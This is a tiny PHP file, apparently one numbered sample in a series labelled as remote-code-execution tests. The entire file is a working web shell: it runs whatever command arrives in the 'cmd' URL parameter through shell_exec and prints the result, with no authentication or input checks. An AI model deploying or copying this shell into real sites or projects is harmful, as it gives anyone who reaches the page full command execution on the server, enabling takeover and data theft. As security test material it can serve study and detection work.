<?php
// RCE test variation #1272
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>